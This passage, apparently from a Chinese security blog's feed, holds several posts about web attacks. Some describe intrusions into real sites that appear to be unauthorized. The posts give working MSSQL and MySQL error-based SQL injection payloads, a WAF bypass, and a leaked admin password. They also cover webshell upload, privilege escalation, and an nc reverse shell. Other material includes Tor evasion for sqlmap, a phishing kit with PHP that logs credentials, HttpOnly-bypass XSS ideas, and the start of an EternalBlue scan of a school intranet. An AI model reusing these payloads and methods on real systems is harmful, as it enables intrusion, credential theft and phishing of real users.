      <category term="XSS" scheme="https://www.se7ensec.cn/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>BC实战|Bypass安全狗</title>
    <link href="https://www.se7ensec.cn/2019/11/11/BC%E5%AE%9E%E6%88%98Bypass%E5%AE%89%E5%85%A8%E7%8B%97/"/>
    <id>https://www.se7ensec.cn/2019/11/11/BC实战Bypass安全狗/</id>
    <published>2019-11-11T03:10:24.000Z</published>
    <updated>2019-12-08T15:57:06.571Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>学以致用。</p></blockquote><a id="more"></a><h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>常规流程走一遍，发现一处标记信息已读的功能点比较可疑：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.11.11/1.png" alt="1"></p><p>抓包加单引号重放：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.11.11/2.png" alt="2"></p><p>可以看到单引号被转义了，看下闭合方式，问题不大，因为有回显，直接使用报错注入。</p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="获取下数据库用户"><a href="#获取下数据库用户" class="headerlink" title="获取下数据库用户"></a>获取下数据库用户</h2><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127) or updatexml(1,concat(0x3a,user()),1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.11.11/3.png" alt="3"></p><h2 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h2><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127) or updatexml(1,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>, (schema_name),<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">FROM</span> information_schema.schemata <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.11.11/4.png" alt="4"></p><h2 id="Bypass安全狗"><a href="#Bypass安全狗" class="headerlink" title="Bypass安全狗"></a>Bypass安全狗</h2><p>掏出前段时间学到的打狗棒法（超长字符Bypass，这里类型不同，原理相同）：<a href="https://mp.weixin.qq.com/s/1cxlGvNWXmzkmyczXJMtvw" target="_blank" rel="noopener">传送门</a></p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.11.11/5.png" alt="5"></p><p>后面的和常规报错没什么不同，就不啰嗦了，领会精神~</p><h1 id="小Tips"><a href="#小Tips" class="headerlink" title="小Tips"></a>小Tips</h1><p>渗透测试中习惯以开发者的角度考虑一个功能的实现，会更快的找到有效的切入点。</p><p>结合<code>BurpSuite</code>的<code>Intruder</code>模块中的<code>Grep-Match</code>功能使用，可以快速提取报错注入的结果。</p><p>超长字符不仅仅可以应用在Bypass安全狗注入，利用参数污染，XSS也是可以滴。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;学以致用。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="https://www.se7ensec.cn/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SQL注入" scheme="https://www.se7ensec.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Xss之HttpOnly下的攻击手法</title>
    <link href="https://www.se7ensec.cn/2019/10/26/Xss%E4%B9%8BHttpOnly%E4%B8%8B%E7%9A%84%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"/>
    <id>https://www.se7ensec.cn/2019/10/26/Xss之HttpOnly下的攻击手法/</id>
    <published>2019-10-26T03:10:24.000Z</published>
    <updated>2019-10-26T17:31:11.355Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>仅作思路整理，实际利用代码未提供，请自行收集。</p></blockquote><a id="more"></a><h1 id="1-phpinfo页"><a href="#1-phpinfo页" class="headerlink" title="1.phpinfo页"></a>1.phpinfo页</h1><p>伪造对方身份访问同站的phpinfo页面，因为同域所以通过ajax提交访问可以读取到responseText，其中$_SERVER[“HTTP_COOKIE”]会打印出具有httponly属性的cookies。</p><p>优点：成功率很高，最不容易被察觉，也是最常用的一种方式。</p><p>缺点：需要phpinfo页，条件苛刻。</p><h1 id="2-框架钓鱼"><a href="#2-框架钓鱼" class="headerlink" title="2.框架钓鱼"></a>2.框架钓鱼</h1><p>通过<code>&lt;iframe&gt;</code>标签嵌入一个远程域，完全撑开后，以覆盖原有的页面。</p><p>优点：无跳转，域名无改变。</p><p>缺点：通常会覆盖某个正常的页面，管理员易察觉。</p><h1 id="3-跳转钓鱼"><a href="#3-跳转钓鱼" class="headerlink" title="3.跳转钓鱼"></a>3.跳转钓鱼</h1><p>通过购买相似域名，构建相同的钓鱼页面，使受害者跳转至钓鱼站。</p><p>优点：主动性较强，可主动钓鱼。</p><p>缺点：成本较高，且由于页面跳转过于明显，所以此方法十分容易被发现。</p><h1 id="4-历史密码"><a href="#4-历史密码" class="headerlink" title="4.历史密码"></a>4.历史密码</h1><p>通过js伪造登录表单，欺骗浏览器自动填入，由此获取浏览器记住的历史密码。</p><p>优点：不易被发现，可直接获取明文，成功率较高。</p><p>缺点：各内核浏览器兼容性不一，最新版google已不支持http协议下的自动填入功能。</p><h1 id="5-获取源码"><a href="#5-获取源码" class="headerlink" title="5.获取源码"></a>5.获取源码</h1><p>通过xss获取后端页面源码，常常可以发现一些越权访问，或者配合CSRF打组合拳去添加新用户或者执行其他的功能，以及通过审计后台js发现一些漏洞等。</p><p>优点：信息获取的比较详细，也可以获取到后台账号名称。</p><p>缺点：局限性较大，不易于利用。</p><p>欢迎师傅们补充。。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;仅作思路整理，实际利用代码未提供，请自行收集。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="https://www.se7ensec.cn/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="XSS" scheme="https://www.se7ensec.cn/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Windows杀软在线对比辅助</title>
    <link href="https://www.se7ensec.cn/2019/09/01/Windows%E6%9D%80%E8%BD%AF%E5%9C%A8%E7%BA%BF%E5%AF%B9%E6%AF%94%E8%BE%85%E5%8A%A9/"/>
    <id>https://www.se7ensec.cn/2019/09/01/Windows杀软在线对比辅助/</id>
    <published>2019-09-01T06:10:24.000Z</published>
    <updated>2019-09-25T17:53:40.301Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>解决平时渗透时的痛点。</p></blockquote><a id="more"></a><p>在渗透测试过程中，Windows主机上总会遇到各种各样的杀软，人工去看系统进程也是比较麻烦的一件事。</p><p>然后发现网上好像也没人写过这个东西，就有了这个Windows杀软在线对比辅助。</p><p>GitHub：<a href="https://github.com/r00tSe7en/get_AV" target="_blank" rel="noopener">https://github.com/r00tSe7en/get_AV</a></p><p>在线版：<a href="http://get-av.se7ensec.cn/" target="_blank" rel="noopener">Windows杀软在线对比辅助</a></p><p>分享出来，一是为了方便有需要的人，二是也希望表哥们可以分享一些平时遇到的比较冷门的杀软进程，后续GitHub和在线版会一直保持同步更新数据。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;解决平时渗透时的痛点。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="编程开发" scheme="https://www.se7ensec.cn/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="HTML" scheme="https://www.se7ensec.cn/tags/HTML/"/>
    
      <category term="PHP" scheme="https://www.se7ensec.cn/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>剑走偏锋：旁站入侵到提权</title>
    <link href="https://www.se7ensec.cn/2019/07/26/%E5%89%91%E8%B5%B0%E5%81%8F%E9%94%8B-%E6%97%81%E7%AB%99%E5%85%A5%E4%BE%B5%E5%88%B0%E6%8F%90%E6%9D%83/"/>
    <id>https://www.se7ensec.cn/2019/07/26/剑走偏锋-旁站入侵到提权/</id>
    <published>2019-07-26T15:59:17.000Z</published>
    <updated>2019-09-25T17:03:35.478Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>已经实习了一个月，感觉每天还是很充实的~</p></blockquote><a id="more"></a><h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>目标站：A.com</p><p>在经过一系列常规操作之后，发现主站没有什么可以入手的地方，好在 A 站没有CDN，可以尝试从旁站切入。</p><p>IP反查，得到大概20几个同服域名，手动过了几个，发现旁站 B.com (aspx+mssql) 某页面参数加单引号后报错，丢到sqlmap里先去跑一下，继续看别的旁站，然而大部分都是WordPress站点或者是纯静态也没什么搞头，看了一会发现sqlmap跑出来的结果如下：</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: ProductID (GET)</span><br><span class="line">Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: ProductID=2' AND 1913=1913 AND 'GquC'='GquC</span><br><span class="line">Type: error-based</span><br><span class="line">    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause(IN)</span><br><span class="line">    Payload: ProductID=2' AND 1360 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (1360=1360) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(113)+CHAR(98)+CHAR(113))) AND 'JOdp'='JOdp</span><br><span class="line">---</span><br><span class="line">web server operating system: Windows 8.1 or 2012 R2</span><br><span class="line">web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 8.5</span><br><span class="line">back-end DBMS: Microsoft SQL Server 2008</span><br></pre></td></tr></table></figure><p>在使用sqlmap继续跑数据时，发现B站所有的动态页面均报错，报错内容翻译过来大致就是数据库短时间内查询请求过多，导致线程池过载无法处理。</p><p>等了大概十分钟左右，站点又恢复了正常，所以关键时刻还是手工靠谱啊。</p><h1 id="mssql报错注入："><a href="#mssql报错注入：" class="headerlink" title="mssql报错注入："></a>mssql报错注入：</h1><p>由于sqlmap给出的提示有报错注入，这里直接用报错注入了，相对来说效率也比较高，下面直接给出注入过程和需要注意的地方：</p><h2 id="获取数据库名："><a href="#获取数据库名：" class="headerlink" title="获取数据库名："></a>获取数据库名：</h2><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. http://B.com/AutoMain.aspx?ProductID=1' and db_name()&gt;0--</span><br><span class="line">b.com_db</span><br></pre></td></tr></table></figure><h2 id="查询当前数据信息："><a href="#查询当前数据信息：" class="headerlink" title="查询当前数据信息："></a>查询当前数据信息：</h2><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. http://B.com/AutoMain.aspx?ProductID=1' having 1=1--</span><br><span class="line">Product.ProductID</span><br></pre></td></tr></table></figure><h2 id="踩坑指南："><a href="#踩坑指南：" class="headerlink" title="踩坑指南："></a>踩坑指南：</h2><p><strong>子查询不支持返回多条数据，且mssql不像MySQL那样支持limit，下面给出解决办法</strong></p><h2 id="获取表名："><a href="#获取表名：" class="headerlink" title="获取表名："></a>获取表名：</h2><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. http://B.com/AutoMain.aspx?ProductID=1' and 1=(select top 1 name from sysobjects where xtype='u' and name !='info');--</span><br><span class="line">2. http://B.com/AutoMain.aspx?ProductID=1' and 1=(select top 1 table_name from information_schema.tables);--</span><br><span class="line">此方法可查询任意用户表：</span><br><span class="line">http://B.com/AutoMain.aspx?ProductID=1' and (select top 1 name from (select top 1 id,name from sysobjects where xtype=char(85)) T order by id desc) &gt; 1--</span><br><span class="line">获取到的用户表：</span><br><span class="line">AdminLogin</span><br></pre></td></tr></table></figure><h2 id="获取列名："><a href="#获取列名：" class="headerlink" title="获取列名："></a>获取列名：</h2><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. http://B.com/AutoMain.aspx?ProductID=1' and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'AdminLogin') and name&lt;&gt;'id');--</span><br><span class="line">2. http://B.com/AutoMain.aspx?ProductID=1' and 1=(select top 1 column_name from information_schema.columns);--</span><br><span class="line">此方法可查询AdminLogin表的任意列：</span><br><span class="line">3. http://B.com/AutoMain.aspx?ProductID=1' and (select top 1 col_name(object_id('AdminLogin'),1) from sysobjects) &gt; 1--</span><br><span class="line">获取到用户表的列名：</span><br><span class="line">AdminID</span><br><span class="line">UserName</span><br><span class="line">Password</span><br></pre></td></tr></table></figure><h2 id="获取数据："><a href="#获取数据：" class="headerlink" title="获取数据："></a>获取数据：</h2><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. http://B.com/AutoMain.aspx?ProductID=1' and (select top 1 UserName from AdminLogin where AdminID=1) &gt; 1--</span><br><span class="line">2. http://B.com/AutoMain.aspx?ProductID=1' and (select top 1 Password from AdminLogin where AdminID=1) &gt; 1--</span><br><span class="line">获取到的账号密码：</span><br><span class="line">admin</span><br><span class="line">islamabad</span><br></pre></td></tr></table></figure><h2 id="效果如图："><a href="#效果如图：" class="headerlink" title="效果如图："></a>效果如图：</h2><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.26/2.png" alt="2"></p><h1 id="旁站GetShell："><a href="#旁站GetShell：" class="headerlink" title="旁站GetShell："></a>旁站GetShell：</h1><p>通过获取到的账号密码成功登B站的网站后台</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.26/3.png" alt="3"></p><p>文件上传处只校验文件类型，上传图片马抓包改后缀即可，连接shell后发现无权限跨目录，只能继续提权了</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.26/4.png" alt="4"></p><h1 id="主机提权："><a href="#主机提权：" class="headerlink" title="主机提权："></a>主机提权：</h1><p>一开始看了下系统进程应该没有杀软（其实是有的，国外的小众杀软名字不是很起眼），补丁也没打几个，以为很好提。</p><p>想着常规操作就能拿下，直接穿了CS的远控上去运行，等了会发现并没有主机上线，仔细一看刚传的木马没了，才知道遇上杀软了。然后又试了几个本地提权的exp，不是被杀就是报错。</p><p>后来想起来土司有老哥分享过免杀的提权神器：<a href="https://www.t00ls.net/viewthread.php?tid=51297" target="_blank" rel="noopener">JuicyPotao</a>，使用方法：<a href="https://www.4hou.com/technology/13698.html" target="_blank" rel="noopener">https://www.4hou.com/technology/13698.html</a></p><h2 id="成功提权："><a href="#成功提权：" class="headerlink" title="成功提权："></a>成功提权：</h2><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.26/5.png" alt="5"></p><p>提权成功之后，后面的操作就行云流水了，目的是拿 A.com 的shell ，先用nc反弹出system权限的cmdshell，然后可以直接写马，也可以远程下载，等等姿势还有很多…</p><h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p><a href="https://www.jianshu.com/p/0cf7bd46237e" target="_blank" rel="noopener">https://www.jianshu.com/p/0cf7bd46237e</a></p><p><a href="https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI" target="_blank" rel="noopener">https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;已经实习了一个月，感觉每天还是很充实的~&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="https://www.se7ensec.cn/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SQL注入" scheme="https://www.se7ensec.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="WIN提权" scheme="https://www.se7ensec.cn/tags/WIN%E6%8F%90%E6%9D%83/"/>
    
      <category term="GetShell" scheme="https://www.se7ensec.cn/tags/GetShell/"/>
    
  </entry>
  
  <entry>
    <title>Tor-IP-Changer实现Sqlmap自动切换代理IP</title>
    <link href="https://www.se7ensec.cn/2019/07/08/Tor-IP-Changer%E5%AE%9E%E7%8E%B0Sqlmap%E8%87%AA%E5%8A%A8%E5%88%87%E6%8D%A2%E4%BB%A3%E7%90%86IP/"/>
    <id>https://www.se7ensec.cn/2019/07/08/Tor-IP-Changer实现Sqlmap自动切换代理IP/</id>
    <published>2019-07-08T15:59:17.000Z</published>
    <updated>2019-09-25T17:03:16.787Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>sqlmap注入的过程中总出现被ban掉IP的情况，面对一片大姨妈，没有代理池只能放弃？</p></blockquote><a id="more"></a><h1 id="使用工具："><a href="#使用工具：" class="headerlink" title="使用工具："></a>使用工具：</h1><p>小飞机、Proxifier、Tor Browser、Tor IP Changer（<a href="https://github.com/seevik2580/tor-ip-changer" target="_blank" rel="noopener">传送门</a>）、Sqlmap</p><h1 id="操作步骤："><a href="#操作步骤：" class="headerlink" title="操作步骤："></a>操作步骤：</h1><h2 id="首先连上小飞机"><a href="#首先连上小飞机" class="headerlink" title="首先连上小飞机"></a>首先连上小飞机</h2><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.08/2.png" alt="2"></p><h2 id="配置Proxifier"><a href="#配置Proxifier" class="headerlink" title="配置Proxifier"></a>配置Proxifier</h2><p>配置代理服务器</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.08/3.png" alt="3"></p><p>配置代理规则</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.08/4.png" alt="4"></p><p>此时你已经是全局代理状态了</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.08/5.png" alt="5"></p><h2 id="配置并打开Tor浏览器（不要关闭）"><a href="#配置并打开Tor浏览器（不要关闭）" class="headerlink" title="配置并打开Tor浏览器（不要关闭）"></a>配置并打开Tor浏览器（不要关闭）</h2><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.08/6.png" alt="6"></p><h2 id="打开Tor-IP-Changer"><a href="#打开Tor-IP-Changer" class="headerlink" title="打开Tor IP Changer"></a>打开Tor IP Changer</h2><p>点击 TOR server -&gt; Start，等待软件自动配置完成</p><p>点击 Options -&gt; Settings -&gt; Interval(IP切换间隔时间，越快越不稳）-&gt; Save</p><p>点击 IP changer -&gt; Start，如下图所示即为成功</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.08/7.png" alt="7"></p><h2 id="Sqlmap命令"><a href="#Sqlmap命令" class="headerlink" title="Sqlmap命令"></a>Sqlmap命令</h2><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u url --tor --tor-type="SOCKS5"</span><br></pre></td></tr></table></figure><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p>使用此方法在匿名度，安全性上都可以大大提高，不过代价就是要牺牲掉一部分速度和稳定性。</p><p><a href="https://www.freebuf.com/column/171981.html" target="_blank" rel="noopener">https://www.freebuf.com/column/171981.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;sqlmap注入的过程中总出现被ban掉IP的情况，面对一片大姨妈，没有代理池只能放弃？&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="https://www.se7ensec.cn/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Sqlmap" scheme="https://www.se7ensec.cn/tags/Sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>圈子社区登陆处任意url跳转实现钓鱼用户</title>
    <link href="https://www.se7ensec.cn/2019/06/10/%E5%9C%88%E5%AD%90%E7%A4%BE%E5%8C%BA%E4%BB%BB%E6%84%8Furl%E8%B7%B3%E8%BD%AC%E5%AE%9E%E7%8E%B0%E8%B4%A6%E5%8F%B7%E9%92%93%E9%B1%BC/"/>
    <id>https://www.se7ensec.cn/2019/06/10/圈子社区任意url跳转实现账号钓鱼/</id>
    <published>2019-06-10T13:00:17.000Z</published>
    <updated>2019-09-25T17:03:06.962Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>漏洞本身倒是没什么大危害，稍加利用下还蛮好玩的。</p></blockquote><a id="more"></a><h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p>圈子社区登陆首页默认链接：<a href="https://www.secquan.org/Login?jump=aHR0cHM6Ly93d3cuc2VjcXVhbi5vcmc=" target="_blank" rel="noopener">https://www.secquan.org/Login?jump=aHR0cHM6Ly93d3cuc2VjcXVhbi5vcmc=</a></p><p>对于上面红框中jump后内容的base64解码为:<a href="https://www.secquan.org" target="_blank" rel="noopener">https://www.secquan.org</a></p><p>这里使用 <a href="https://www.baidu.com" target="_blank" rel="noopener">https://www.baidu.com</a> 的base64加密后的内容替换下，构造出的链接为：</p><p><a href="https://www.secquan.org/Login?jump=aHR0cHM6Ly93d3cuYmFpZHUuY29t" target="_blank" rel="noopener">https://www.secquan.org/Login?jump=aHR0cHM6Ly93d3cuYmFpZHUuY29t</a></p><p>登陆成功后即自动跳转至百度。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.06.11/2.gif" alt="2"></p><h1 id="利用设想"><a href="#利用设想" class="headerlink" title="利用设想"></a>利用设想</h1><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.06.11/3.png" alt="3"></p><h1 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h1><h2 id="访问构造好的钓鱼链接，正常登陆"><a href="#访问构造好的钓鱼链接，正常登陆" class="headerlink" title="访问构造好的钓鱼链接，正常登陆"></a>访问构造好的钓鱼链接，正常登陆</h2><p>（能力有限，做不到太完美，不过看着倒是像那么回事）：</p><h2 id="先看一下页面跳转时弹窗的效果"><a href="#先看一下页面跳转时弹窗的效果" class="headerlink" title="先看一下页面跳转时弹窗的效果"></a>先看一下页面跳转时弹窗的效果</h2><p><strong>※ 以下均在qq中测试效果</strong></p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.06.11/4.jpg" alt="4"></p><p>其实弹窗这里的标题默认是有网址显示的，这样等于直接暴露地址了，加一段JS来重写alert方法即可。</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="hljs-built_in">window</span>.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">name</span>)</span>&#123;</span><br><span class="line"><span class="hljs-keyword">var</span> iframe = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"IFRAME"</span>);</span><br><span class="line">iframe.style.display=<span class="hljs-string">"none"</span>;</span><br><span class="line">iframe.setAttribute(<span class="hljs-string">"src"</span>, <span class="hljs-string">'data:text/plain,'</span>);</span><br><span class="line"><span class="hljs-built_in">document</span>.documentElement.appendChild(iframe);</span><br><span class="line"><span class="hljs-built_in">window</span>.frames[<span class="hljs-number">0</span>].window.alert(name);</span><br><span class="line">iframe.parentNode.removeChild(iframe);</span><br><span class="line">&#125;</span><br><span class="line">alert(<span class="hljs-string">"账号异常，请重新登陆"</span>);</span><br><span class="line">&lt;<span class="hljs-regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="首页成品是这样的（勉勉强强以假乱真）"><a href="#首页成品是这样的（勉勉强强以假乱真）" class="headerlink" title="首页成品是这样的（勉勉强强以假乱真）"></a>首页成品是这样的（勉勉强强以假乱真）</h2><p>Ctrl+S将社区登陆的首页静态页面保存在了本地，进行了一番修改（配合接收账号密码的php文件），弄了会儿发现验证码无法调用，索性直接删除吧，感觉这个验证码是最失败的地方。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.06.11/5.jpg" alt="5"></p><h2 id="后台简单写个接收账号密码的php页面"><a href="#后台简单写个接收账号密码的php页面" class="headerlink" title="后台简单写个接收账号密码的php页面"></a>后台简单写个接收账号密码的php页面</h2><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span> </span><br><span class="line">$email=$_POST[<span class="hljs-string">'email'</span>];</span><br><span class="line">$password=$_POST[<span class="hljs-string">'password'</span>];</span><br><span class="line">$result=$email.<span class="hljs-string">"|"</span>.$password; </span><br><span class="line">file_put_contents(<span class="hljs-string">"fish.txt"</span>, $result.PHP_EOL, FILE_APPEND);</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;window.location.href='https://www.secquan.org'&lt;/script&gt;"</span>; </span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="钓鱼成功"><a href="#钓鱼成功" class="headerlink" title="钓鱼成功"></a>钓鱼成功</h2><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.06.11/6.png" alt="6"></p><p>最后用户输入的内容被写入到同目录下的fish.txt中,且页面被重定向至 <a href="https://www.secquan.org" target="_blank" rel="noopener">https://www.secquan.org</a> ，由于之前登陆成功的会话还在，所以直接就是已登陆的状态了。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;漏洞本身倒是没什么大危害，稍加利用下还蛮好玩的。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="https://www.se7ensec.cn/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="钓鱼" scheme="https://www.se7ensec.cn/tags/%E9%92%93%E9%B1%BC/"/>
    
  </entry>
  
  <entry>
    <title>渗透学校某内网服务器</title>
    <link href="https://www.se7ensec.cn/2019/04/01/%E6%B8%97%E9%80%8F%E5%AD%A6%E6%A0%A1%E6%9F%90%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>https://www.se7ensec.cn/2019/04/01/渗透学校某内网服务器/</id>
    <published>2019-04-01T13:00:17.000Z</published>
    <updated>2019-09-03T13:36:30.732Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.04.01/1.png" alt="1"></p><blockquote><p>”黑“掉自己的学校，可能是大多数黑阔们学生时代共同的执念。</p></blockquote><a id="more"></a><h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>心血来潮，突然想看看学校有没有能用永恒之蓝打下来的机器，顺便来一波内网渗透，想想上一次测试还是刚爆出永恒之蓝的利用工具的时候，那时候msf都还没整合进去，现在直接就能用msf方便多了。</p><h1 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h1><p>已知 10.10.10.0/24 为学校各种服务器使用的IP</p><p>使用MSF中的批量ms17_010验证模块：</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="hljs-built_in">set</span> rhosts 10.10.10.0-10.10.10.254</span><br><span class="line">rhosts =&gt; 10.10.10.0-10.10.10.254</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="hljs-built_in">set</span> threads 20</span><br><span class="line">threads =&gt; 20</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; exploit</span><br></pre></td></tr></table></figure><p>扫描的结果如下</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.04.01/2.png" alt="2"></p><h1 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h1><h2 id="获取cmdshell"><a href="#获取cmdshell" class="headerlink" title="获取cmdshell"></a>获取cmdshell</h2><p>经测试IP为10.10.10.104的主机（2008 